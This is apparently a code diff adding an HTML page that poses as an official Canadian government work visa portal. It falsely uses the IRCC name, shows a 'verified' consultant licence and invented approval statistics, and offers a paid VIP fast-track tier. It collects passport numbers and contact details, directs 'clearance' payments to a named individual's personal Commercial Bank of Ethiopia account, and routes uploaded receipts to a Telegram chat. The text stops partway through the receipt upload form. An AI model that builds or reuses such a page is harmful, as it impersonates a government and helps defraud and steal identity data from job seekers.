@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canada Work Visa Official Portal & Payment Verification System</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts: Inter, Montserrat, Cinzel -->
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=Montserrat:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        canadaRed: {
+                            50: '#FFEBEE',
+                            100: '#FFCDD2',
+                            500: '#EF5350',
+                            600: '#E53935',
+                            700: '#D80027', // Royal Canada Crimson
+                            800: '#C62828',
+                            900: '#B71C1C',
+                        },
+                        diplomaticNavy: {
+                            50: '#F0F4F8',
+                            100: '#D9E2EC',
+                            700: '#102A43',
+                            800: '#0C2340', // Deep Diplomatic Navy
+                            900: '#081726',
+                            950: '#040C14',
+                        },
+                        amberGold: {
+                            300: '#F7D070',
+                            400: '#E5C158',
+                            500: '#D4AF37', // Warm Gold
+                            600: '#B89320',
+                        },
+                        emeraldShield: {
+                            50: '#ECFDF5',
+                            100: '#D1FAE5',
+                            500: '#10B981',
+                            600: '#059669',
+                            700: '#047857',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        montserrat: ['Montserrat', 'sans-serif'],
+                        serif: ['Cinzel', 'serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #F8FAFC;
+            color: #0F172A;
+            overflow-x: hidden;
+        }
+
+        /* Official White Card Shadow Styling */
+        .trust-card {
+            background: #FFFFFF;
+            border: 1px solid #E2E8F0;
+            box-shadow: 0 10px 25px -5px rgba(12, 35, 64, 0.06), 0 8px 10px -6px rgba(12, 35, 64, 0.04);
+            border-radius: 1rem;
+        }
+
+        .trust-card-hover {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .trust-card-hover:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 30px -10px rgba(12, 35, 64, 0.12);
+            border-color: #CBD5E1;
+        }
+
+        /* Gold Shimmer Effect */
+        .shimmer-btn {
+            position: relative;
+            overflow: hidden;
+        }
+        .shimmer-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                60deg,
+                transparent 30%,
+                rgba(255, 255, 255, 0.3) 50%,
+                transparent 70%
+            );
+            transform: rotate(30deg);
+            animation: shimmerEffect 4s infinite;
+        }
+        @keyframes shimmerEffect {
+            0% { transform: translate(-100%, -100%) rotate(30deg); }
+            20% { transform: translate(100%, 100%) rotate(30deg); }
+            100% { transform: translate(100%, 100%) rotate(30deg); }
+        }
+
+        /* CBE Bank Card Design */
+        .cbe-official-card {
+            background: linear-gradient(135deg, #0C2340 0%, #102A43 60%, #081726 100%);
+            border-left: 6px solid #D4AF37;
+            box-shadow: 0 15px 35px -5px rgba(12, 35, 64, 0.25);
+        }
+
+        /* Pulse Animation */
+        @keyframes pulseGlow {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+        .pulse-badge {
+            animation: pulseGlow 2s infinite ease-in-out;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #F1F5F9;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #94A3B8;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #0C2340;
+        }
+
+        /* Print Voucher Styles */
+        @media print {
+            body * {
+                visibility: hidden;
+            }
+            #printableVoucherArea, #printableVoucherArea * {
+                visibility: visible;
+            }
+            #printableVoucherArea {
+                position: absolute;
+                left: 0;
+                top: 0;
+                width: 100%;
+                background: #FFFFFF !important;
+                color: #000000 !important;
+                border: 2px solid #000000 !important;
+                box-shadow: none !important;
+            }
+        }
+    </style>
+</head>
+<body class="font-sans antialiased min-h-screen flex flex-col justify-between selection:bg-canadaRed-700 selection:text-white">
+
+    <!-- TOP DIPLOMATIC & SERVER STATUS BANNER -->
+    <div class="bg-diplomaticNavy-900 text-slate-200 py-2.5 px-4 border-b border-amberGold-500/30 relative z-20">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between text-xs gap-2">
+            
+            <div class="flex items-center space-x-3">
+                <span class="bg-canadaRed-700 text-white font-extrabold px-2.5 py-0.5 rounded text-[10px] tracking-widest uppercase font-montserrat flex items-center space-x-1.5">
+                    <i class="fa-solid fa-leaf text-white"></i>
+                    <span>IMMIGRATION CANADA</span>
+                </span>
+                <span class="text-slate-300 font-medium hidden md:inline">Official Work Visa Portal & CBE Deposit Clearance Desk</span>
+            </div>
+
+            <!-- Dual Clocks & License Badge -->
+            <div class="flex items-center space-x-4 font-mono text-[11px]">
+                <div class="flex items-center space-x-2 text-slate-300">
+                    <span class="flex items-center space-x-1"><i class="fa-regular fa-clock text-amberGold-400"></i><span id="clockOttawa">OTTAWA: 00:00</span></span>
+                    <span class="text-slate-500">|</span>
+                    <span class="flex items-center space-x-1 text-amberGold-300"><span id="clockAddis">ADDIS ABABA: 00:00</span></span>
+                </div>
+                <div class="hidden lg:flex items-center space-x-1.5 bg-emeraldShield-700/40 border border-emeraldShield-500/40 text-emeraldShield-100 px-2.5 py-0.5 rounded-full text-[10px]">
+                    <i class="fa-solid fa-shield-check text-emeraldShield-400"></i>
+                    <span>RCIC #R539821 VERIFIED</span>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- MAIN NAVBAR WITH NAVIGATION TABS -->
+    <header class="bg-white sticky top-0 z-30 border-b border-slate-200 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            
+            <!-- Logo Brand -->
+            <div class="flex items-center space-x-3 cursor-pointer" onclick="switchTab('home')">
+                <div class="w-12 h-12 rounded-xl bg-canadaRed-700 text-white flex items-center justify-center text-2xl shadow-md">
+                    <i class="fa-solid fa-leaf"></i>
+                </div>
+                <div>
+                    <h1 class="font-serif font-black text-xl text-diplomaticNavy-800 tracking-wider flex items-center space-x-2">
+                        <span>CANADA</span>
+                        <span class="text-canadaRed-700 font-sans text-xs font-bold px-2 py-0.5 rounded bg-canadaRed-50 border border-canadaRed-100">VISA PORTAL</span>
+                    </h1>
+                    <span class="text-[10px] font-mono tracking-widest text-slate-500 uppercase block -mt-1">Immigration, Refugees and Citizenship Canada</span>
+                </div>
+            </div>
+
+            <!-- Tab Navigation Links -->
+            <nav class="hidden lg:flex items-center space-x-1 bg-slate-100 p-1.5 rounded-xl border border-slate-200 font-montserrat text-xs font-semibold">
+                <button onclick="switchTab('home')" id="tabBtn-home" class="px-4 py-2 rounded-lg transition-all duration-200 text-white bg-diplomaticNavy-800 shadow">
+                    <i class="fa-solid fa-house mr-1.5"></i>Home Portal
+                </button>
+                <button onclick="switchTab('jobs')" id="tabBtn-jobs" class="px-4 py-2 rounded-lg transition-all duration-200 text-slate-600 hover:text-diplomaticNavy-800">
+                    <i class="fa-solid fa-briefcase mr-1.5"></i>Available Jobs & LMIA
+                </button>
+                <button onclick="switchTab('registration')" id="tabBtn-registration" class="px-4 py-2 rounded-lg transition-all duration-200 text-slate-600 hover:text-diplomaticNavy-800">
+                    <i class="fa-solid fa-file-signature mr-1.5"></i>Direct Registration
+                </button>
+                <button onclick="switchTab('receiptDesk')" id="tabBtn-receiptDesk" class="px-4 py-2 rounded-lg transition-all duration-200 text-slate-600 hover:text-diplomaticNavy-800">
+                    <i class="fa-solid fa-receipt mr-1.5"></i>Payment Receipt Desk
+                </button>
+                <button onclick="switchTab('verificationStatus')" id="tabBtn-verificationStatus" class="px-4 py-2 rounded-lg transition-all duration-200 text-slate-600 hover:text-diplomaticNavy-800">
+                    <i class="fa-solid fa-magnifying-glass mr-1.5"></i>Verification Status
+                </button>
+            </nav>
+
+            <!-- Quick CBE Copy Header Trigger -->
+            <div class="flex items-center space-x-3">
+                <button onclick="copyCBEAccount()" class="shimmer-btn bg-diplomaticNavy-800 hover:bg-diplomaticNavy-900 text-white font-black px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 shadow-md transition transform hover:scale-105 border border-diplomaticNavy-700">
+                    <i class="fa-solid fa-building-columns text-amberGold-400"></i>
+                    <span class="hidden sm:inline text-slate-200">CBE:</span>
+                    <span class="font-mono text-amberGold-400 font-bold">1000752378065</span>
+                </button>
+            </div>
+
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT CONTAINER -->
+    <main class="relative z-10 flex-grow py-8 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full space-y-10">
+
+        <!-- ========================================================================= -->
+        <!-- TAB 1: HOME PORTAL -->
+        <!-- ========================================================================= -->
+        <div id="page-home" class="space-y-10 transition-all duration-300">
+            
+            <!-- Hero Banner -->
+            <div class="relative rounded-3xl overflow-hidden bg-white border border-slate-200 p-8 md:p-12 shadow-sm">
+                <div class="absolute right-0 top-0 w-1/3 h-full bg-gradient-to-l from-canadaRed-50 to-transparent pointer-events-none hidden md:block"></div>
+                
+                <div class="grid lg:grid-cols-12 gap-8 items-center relative z-10">
+                    <div class="lg:col-span-7 space-y-6">
+                        <div class="inline-flex items-center space-x-2 bg-emeraldShield-50 border border-emeraldShield-200 px-3 py-1.5 rounded-full text-xs font-mono text-emeraldShield-700">
+                            <i class="fa-solid fa-circle-check text-emeraldShield-500"></i>
+                            <span class="font-bold">Authorized Foreign Worker Clearance Stream 2026</span>
+                        </div>
+
+                        <h2 class="font-serif font-black text-3xl md:text-5xl text-diplomaticNavy-800 tracking-tight leading-tight">
+                            Canada Work Visa & <br>
+                            <span class="text-canadaRed-700">Payment Verification Desk</span>
+                        </h2>
+
+                        <p class="text-sm text-slate-600 leading-relaxed max-w-xl">
+                            Register your candidate details and submit your Commercial Bank of Ethiopia (CBE) deposit receipt for primary account holder <strong class="text-diplomaticNavy-800">Girum Ferede</strong> (<span class="font-mono font-bold text-canadaRed-700">1000752378065</span>).
+                        </p>
+
+                        <!-- Action Buttons -->
+                        <div class="flex flex-wrap items-center gap-4 pt-2">
+                            <button onclick="switchTab('registration')" class="shimmer-btn bg-canadaRed-700 hover:bg-canadaRed-800 text-white font-montserrat font-extrabold px-6 py-3.5 rounded-xl text-xs uppercase tracking-wider shadow-md transition transform hover:scale-105 border border-canadaRed-800">
+                                <i class="fa-solid fa-paper-plane mr-2"></i>Start Registration
+                            </button>
+                            <button onclick="switchTab('receiptDesk')" class="bg-diplomaticNavy-800 hover:bg-diplomaticNavy-900 text-white font-montserrat font-extrabold px-6 py-3.5 rounded-xl text-xs uppercase tracking-wider transition shadow-md">
+                                <i class="fa-solid fa-receipt mr-2 text-amberGold-400"></i>Upload Payment Receipt
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Trust Metrics Grid -->
+                    <div class="lg:col-span-5 grid grid-cols-2 gap-4">
+                        <div class="trust-card p-5 text-center space-y-1">
+                            <div class="text-3xl font-black font-montserrat text-canadaRed-700">1,480+</div>
+                            <div class="text-[11px] text-slate-500 font-medium">Clearance Permits Issued</div>
+                        </div>
+                        <div class="trust-card p-5 text-center space-y-1">
+                            <div class="text-3xl font-black font-montserrat text-emeraldShield-600">99.4%</div>
+                            <div class="text-[11px] text-slate-500 font-medium">Verification Approval</div>
+                        </div>
+                        <div class="trust-card p-5 text-center space-y-1">
+                            <div class="text-3xl font-black font-montserrat text-diplomaticNavy-800">#R539821</div>
+                            <div class="text-[11px] text-slate-500 font-medium">RCIC License Code</div>
+                        </div>
+                        <div class="trust-card p-5 text-center space-y-1">
+                            <div class="text-3xl font-black font-montserrat text-amberGold-600">100%</div>
+                            <div class="text-[11px] text-slate-500 font-medium">ESDC LMIA Compliant</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PROMINENT CBE BANK DETAILS BANNER -->
+            <div class="cbe-official-card rounded-2xl p-6 md:p-8 text-white relative overflow-hidden">
+                <div class="flex flex-col lg:flex-row items-center justify-between gap-6 relative z-10">
+                    <div class="space-y-2 text-center lg:text-left">
+                        <div class="inline-flex items-center space-x-2 bg-white/10 px-3 py-1 rounded-full text-xs font-mono text-amberGold-300">
+                            <i class="fa-solid fa-building-columns"></i>
+                            <span>COMMERCIAL BANK OF ETHIOPIA (CBE) BENEFICIARY</span>
+                        </div>
+                        <h3 class="font-serif font-black text-2xl tracking-wide text-white">Direct Transfer Verification Desk</h3>
+                        <p class="text-xs text-slate-300 max-w-lg">
+                            All registration clearance payments must be deposited to primary account holder <strong class="text-amberGold-400 uppercase font-bold">Girum Ferede</strong>.
+                        </p>
+                    </div>
+
+                    <div class="bg-white text-slate-900 p-5 rounded-xl space-y-3 min-w-[320px] shadow-lg border border-slate-200">
+                        <div>
+                            <span class="text-[10px] font-mono uppercase text-slate-500 tracking-widest block">Account Holder Name</span>
+                            <span class="text-lg font-black font-montserrat text-diplomaticNavy-800 uppercase flex items-center space-x-2">
+                                <span>Girum Ferede</span>
+                                <i class="fa-solid fa-circle-check text-emeraldShield-600 text-sm"></i>
+                            </span>
+                        </div>
+                        <div class="border-t border-slate-200 pt-2">
+                            <span class="text-[10px] font-mono uppercase text-slate-500 tracking-widest block">CBE Account Number</span>
+                            <div class="flex items-center justify-between bg-slate-50 p-2.5 rounded-lg border border-slate-300 mt-1">
+                                <span class="text-lg font-mono font-black text-canadaRed-700">1000752378065</span>
+                                <button onclick="copyCBEAccount()" class="bg-diplomaticNavy-800 hover:bg-diplomaticNavy-900 text-white font-bold text-xs px-3 py-1.5 rounded transition shadow">
+                                    Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Process Step-by-Step Guide -->
+            <div class="space-y-6">
+                <div class="text-center space-y-2 max-w-2xl mx-auto">
+                    <h3 class="font-serif font-black text-2xl text-diplomaticNavy-800">4-Step Application Workflow</h3>
+                    <p class="text-xs text-slate-500">Follow our accredited procedure to submit candidate registration and upload payment receipt.</p>
+                </div>
+
+                <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                    <div class="trust-card trust-card-hover p-6 rounded-xl space-y-3 relative">
+                        <div class="w-10 h-10 rounded-lg bg-canadaRed-50 text-canadaRed-700 font-black flex items-center justify-center font-mono">01</div>
+                        <h4 class="font-montserrat font-bold text-sm text-diplomaticNavy-800">Fill Personal Details</h4>
+                        <p class="text-xs text-slate-500">Enter applicant full name, passport number, phone, and target work category.</p>
+                    </div>
+
+                    <div class="trust-card trust-card-hover p-6 rounded-xl space-y-3 relative">
+                        <div class="w-10 h-10 rounded-lg bg-canadaRed-50 text-canadaRed-700 font-black flex items-center justify-center font-mono">02</div>
+                        <h4 class="font-montserrat font-bold text-sm text-diplomaticNavy-800">Transfer to CBE</h4>
+                        <p class="text-xs text-slate-500">Deposit clearance payment to account holder <strong>Girum Ferede</strong> (CBE: 1000752378065).</p>
+                    </div>
+
+                    <div class="trust-card trust-card-hover p-6 rounded-xl space-y-3 relative">
+                        <div class="w-10 h-10 rounded-lg bg-canadaRed-50 text-canadaRed-700 font-black flex items-center justify-center font-mono">03</div>
+                        <h4 class="font-montserrat font-bold text-sm text-diplomaticNavy-800">Upload Receipt</h4>
+                        <p class="text-xs text-slate-500">Attach screenshot or PDF of deposit slip on the Payment Receipt Desk.</p>
+                    </div>
+
+                    <div class="trust-card trust-card-hover p-6 rounded-xl space-y-3 relative">
+                        <div class="w-10 h-10 rounded-lg bg-canadaRed-50 text-canadaRed-700 font-black flex items-center justify-center font-mono">04</div>
+                        <h4 class="font-montserrat font-bold text-sm text-diplomaticNavy-800">Telegram Dispatch</h4>
+                        <p class="text-xs text-slate-500">Automatic dispatch to Telegram Bot API with instant QR clearance pass generation.</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- TAB 2: AVAILABLE JOBS & LMIA -->
+        <!-- ========================================================================= -->
+        <div id="page-jobs" class="hidden space-y-8 transition-all duration-300">
+            <div class="text-center space-y-2 max-w-2xl mx-auto">
+                <h2 class="font-serif font-black text-3xl text-diplomaticNavy-800">Available Canada Work Streams</h2>
+                <p class="text-xs text-slate-500">Approved ESDC Labour Market Impact Assessment (LMIA) categories for 2026 application.</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-6">
+                
+                <div class="trust-card trust-card-hover p-6 rounded-2xl space-y-4">
+                    <div class="w-12 h-12 rounded-xl bg-amberGold-50 text-amberGold-600 border border-amberGold-300 flex items-center justify-center text-2xl">
+                        <i class="fa-solid fa-wheat-awn"></i>
+                    </div>
+                    <h4 class="font-montserrat font-bold text-base text-diplomaticNavy-800">Agriculture & Harvest</h4>
+                    <p class="text-xs text-slate-500 leading-relaxed">Greenhouse management, crop harvesting, and equipment operation across Ontario and Alberta.</p>
+                    <button onclick="selectCategoryAndApply('Agriculture & Harvest')" class="text-xs font-extrabold text-canadaRed-700 hover:text-canadaRed-800 flex items-center space-x-1">
+                        <span>Select Category</span> <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                    </button>
+                </div>
+
+                <div class="trust-card trust-card-hover p-6 rounded-2xl space-y-4">
+                    <div class="w-12 h-12 rounded-xl bg-canadaRed-50 text-canadaRed-700 border border-canadaRed-200 flex items-center justify-center text-2xl">
+                        <i class="fa-solid fa-user-doctor"></i>
+                    </div>
+                    <h4 class="font-montserrat font-bold text-base text-diplomaticNavy-800">Healthcare & Support</h4>
+                    <p class="text-xs text-slate-500 leading-relaxed">Certified nursing aides, care facility assistants, and home support workers with expedited clearance.</p>
+                    <button onclick="selectCategoryAndApply('Healthcare & Support')" class="text-xs font-extrabold text-canadaRed-700 hover:text-canadaRed-800 flex items-center space-x-1">
+                        <span>Select Category</span> <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                    </button>
+                </div>
+
+                <div class="trust-card trust-card-hover p-6 rounded-2xl space-y-4">
+                    <div class="w-12 h-12 rounded-xl bg-emeraldShield-50 text-emeraldShield-600 border border-emeraldShield-200 flex items-center justify-center text-2xl">
+                        <i class="fa-solid fa-helmet-safety"></i>
+                    </div>
+                    <h4 class="font-montserrat font-bold text-base text-diplomaticNavy-800">Construction & Heavy Craft</h4>
+                    <p class="text-xs text-slate-500 leading-relaxed">Welders, heavy machinery operators, carpenters, and commercial building technicians.</p>
+                    <button onclick="selectCategoryAndApply('Construction & Heavy Craft')" class="text-xs font-extrabold text-canadaRed-700 hover:text-canadaRed-800 flex items-center space-x-1">
+                        <span>Select Category</span> <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                    </button>
+                </div>
+
+                <div class="trust-card trust-card-hover p-6 rounded-2xl space-y-4">
+                    <div class="w-12 h-12 rounded-xl bg-slate-100 text-diplomaticNavy-800 border border-slate-300 flex items-center justify-center text-2xl">
+                        <i class="fa-solid fa-utensils"></i>
+                    </div>
+                    <h4 class="font-montserrat font-bold text-base text-diplomaticNavy-800">Hospitality & Culinary</h4>
+                    <p class="text-xs text-slate-500 leading-relaxed">Hotel service associates, chef assistants, and food preparation specialists.</p>
+                    <button onclick="selectCategoryAndApply('Hospitality & Culinary')" class="text-xs font-extrabold text-canadaRed-700 hover:text-canadaRed-800 flex items-center space-x-1">
+                        <span>Select Category</span> <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                    </button>
+                </div>
+
+                <div class="trust-card trust-card-hover p-6 rounded-2xl space-y-4">
+                    <div class="w-12 h-12 rounded-xl bg-indigo-50 text-indigo-700 border border-indigo-200 flex items-center justify-center text-2xl">
+                        <i class="fa-solid fa-laptop-code"></i>
+                    </div>
+                    <h4 class="font-montserrat font-bold text-base text-diplomaticNavy-800">IT & Tech Specialist</h4>
+                    <p class="text-xs text-slate-500 leading-relaxed">Software developers, network technicians, and IT support specialists under Global Talent Stream.</p>
+                    <button onclick="selectCategoryAndApply('IT & Tech Specialist')" class="text-xs font-extrabold text-canadaRed-700 hover:text-canadaRed-800 flex items-center space-x-1">
+                        <span>Select Category</span> <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- TAB 3: DIRECT REGISTRATION -->
+        <!-- ========================================================================= -->
+        <div id="page-registration" class="hidden space-y-8 transition-all duration-300">
+            
+            <div class="trust-card p-8 rounded-3xl max-w-3xl mx-auto space-y-6">
+                <div class="border-b border-slate-200 pb-4 flex items-center justify-between">
+                    <div>
+                        <h3 class="font-serif font-black text-xl text-diplomaticNavy-800">Candidate Registration Form</h3>
+                        <p class="text-xs text-slate-500">Provide official passport credentials to initialize application clearance.</p>
+                    </div>
+                    <span class="bg-slate-100 border border-slate-300 text-diplomaticNavy-800 text-[10px] font-mono px-3 py-1 rounded-full font-bold">
+                        FORM IMM-2026-REG
+                    </span>
+                </div>
+
+                <form id="visaRegistrationForm" onsubmit="handleRegistrationSubmit(event)" class="space-y-4">
+                    
+                    <div class="grid sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Full Applicant Name *</label>
+                            <input type="text" id="regFullName" required placeholder="Abebe Bikila" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700">
+                        </div>
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Passport Number *</label>
+                            <input type="text" id="regPassportNo" required placeholder="EP9876543" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700 font-mono uppercase">
+                        </div>
+                    </div>
+
+                    <div class="grid sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Phone Number *</label>
+                            <input type="tel" id="regPhone" required placeholder="+251 911 234 567" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700">
+                        </div>
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Email Address *</label>
+                            <input type="email" id="regEmail" required placeholder="candidate@example.com" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700">
+                        </div>
+                    </div>
+
+                    <div class="grid sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">City / Region *</label>
+                            <input type="text" id="regCity" required placeholder="Addis Ababa" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700">
+                        </div>
+                        <div>
+                            <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Work Category *</label>
+                            <select id="regCategory" required class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 focus:outline-none focus:border-canadaRed-700">
+                                <option value="Agriculture & Harvest">Agriculture & Harvest Stream</option>
+                                <option value="Healthcare & Support">Healthcare & Nursing Stream</option>
+                                <option value="Construction & Heavy Craft">Construction & Trades Stream</option>
+                                <option value="Hospitality & Culinary">Hospitality & Culinary Stream</option>
+                                <option value="IT & Tech Specialist">IT & Tech Specialist</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Processing Queue Tier *</label>
+                        <select id="regTier" required class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 focus:outline-none focus:border-canadaRed-700">
+                            <option value="Standard LMIA Queue Tier">Standard Document Audit Queue</option>
+                            <option value="VIP Diplomatic Priority Fast-Track Tier">VIP Diplomatic Priority Fast-Track</option>
+                        </select>
+                    </div>
+
+                    <div class="pt-4 border-t border-slate-200 flex justify-end">
+                        <button type="submit" class="shimmer-btn bg-canadaRed-700 hover:bg-canadaRed-800 text-white font-montserrat font-extrabold px-8 py-3.5 rounded-xl text-xs uppercase tracking-wider shadow-md">
+                            Proceed to Payment Receipt Upload <i class="fa-solid fa-arrow-right ml-2"></i>
+                        </button>
+                    </div>
+
+                </form>
+            </div>
+
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- TAB 4: PAYMENT RECEIPT DESK -->
+        <!-- ========================================================================= -->
+        <div id="page-receiptDesk" class="hidden space-y-8 transition-all duration-300">
+            
+            <div class="grid lg:grid-cols-12 gap-8 items-start">
+                
+                <!-- Left Column: CBE Bank Card -->
+                <div class="lg:col-span-5 space-y-6">
+                    
+                    <div class="cbe-official-card p-6 rounded-2xl text-white space-y-5">
+                        <div class="flex items-center justify-between border-b border-white/10 pb-3">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-10 h-10 rounded-xl bg-purple-900 text-white flex items-center justify-center text-xl font-black shadow">
+                                    <i class="fa-solid fa-building-columns"></i>
+                                </div>
+                                <div>
+                                    <h4 class="font-montserrat font-bold text-sm text-white">Commercial Bank of Ethiopia</h4>
+                                    <p class="text-[10px] text-amberGold-300 font-mono uppercase tracking-wider">Beneficiary Deposit Card</p>
+                                </div>
+                            </div>
+                            <span class="bg-emeraldShield-600 text-white text-[9px] font-mono font-bold px-2 py-0.5 rounded uppercase">
+                                VERIFIED
+                            </span>
+                        </div>
+
+                        <div class="space-y-4">
+                            <div>
+                                <span class="text-[10px] font-mono text-slate-300 uppercase tracking-widest block">Primary Account Holder</span>
+                                <div class="text-xl font-black font-montserrat tracking-tight text-white uppercase flex items-center space-x-2 mt-0.5">
+                                    <span>Girum Ferede</span>
+                                    <i class="fa-solid fa-circle-check text-emeraldShield-400 text-base"></i>
+                                </div>
+                            </div>
+
+                            <div>
+                                <span class="text-[10px] font-mono text-slate-300 uppercase tracking-widest block">CBE Account Number</span>
+                                <div class="flex items-center justify-between bg-diplomaticNavy-950 p-3 rounded-xl border border-amberGold-500/40 mt-1">
+                                    <span class="text-lg font-mono font-black text-amberGold-400">1000752378065</span>
+                                    <button onclick="copyCBEAccount()" class="bg-amberGold-500 hover:bg-amberGold-400 text-diplomaticNavy-950 font-black text-xs px-3 py-1.5 rounded-lg transition shadow">
+                                        Copy
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 4 Step CBE Mobile Guide -->
+                        <div class="pt-3 border-t border-white/10 space-y-2 text-xs">
+                            <h5 class="font-bold text-amberGold-300 text-[11px] uppercase tracking-wider">CBE Mobile Banking Steps:</h5>
+                            <ol class="list-decimal list-inside space-y-1 text-slate-300 text-[11px]">
+                                <li>Open CBE Birr or CBE Mobile Banking App</li>
+                                <li>Select <strong>Transfer to CBE Account</strong></li>
+                                <li>Enter Account: <strong class="font-mono text-white">1000752378065</strong></li>
+                                <li>Confirm Holder: <strong class="text-white">Girum Ferede</strong> & Save Receipt</li>
+                            </ol>
+                        </div>
+                    </div>
+
+                    <!-- Telegram Status Box -->
+                    <div class="trust-card p-5 rounded-xl space-y-2 text-xs text-slate-600">
+                        <h4 class="font-montserrat font-bold text-diplomaticNavy-800 uppercase text-[11px] tracking-wider border-b border-slate-200 pb-2">
+                            <i class="fa-solid fa-paper-plane text-canadaRed-700 mr-1.5"></i>Telegram Bot Dispatch Status
+                        </h4>
+                        <p>Uploaded deposit slips route automatically to Telegram Chat ID: <strong class="text-diplomaticNavy-800 font-mono">8267646853</strong>.</p>
+                    </div>
+
+                </div>
+
+                <!-- Right Column: Receipt Upload Form -->
+                <div class="lg:col-span-7">
+                    
+                    <div class="trust-card p-6 sm:p-8 rounded-3xl space-y-6">
+                        
+                        <div class="border-b border-slate-200 pb-4">
+                            <h3 class="font-serif font-black text-xl text-diplomaticNavy-800 flex items-center space-x-2">
+                                <i class="fa-solid fa-file-invoice-dollar text-canadaRed-700"></i>
+                                <span>Deposit Receipt Upload Desk</span>
+                            </h3>
+                            <p class="text-xs text-slate-500">Attach your CBE deposit screenshot or PDF file to generate your official clearance pass.</p>
+                        </div>
+
+                        <form id="receiptSubmissionForm" onsubmit="handleReceiptSubmit(event)" class="space-y-4">
+                            
+                            <div class="grid sm:grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Application Reference ID *</label>
+                                    <input type="text" id="rcptAppRef" required placeholder="CAN-WORK-2026-89241" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700 font-mono uppercase">
+                                </div>
+                                <div>
+                                    <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Applicant Passport Name *</label>
+                                    <input type="text" id="rcptFullName" required placeholder="Abebe Bikila" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700">
+                                </div>
+                            </div>
+
+                            <div class="grid sm:grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Passport Number *</label>
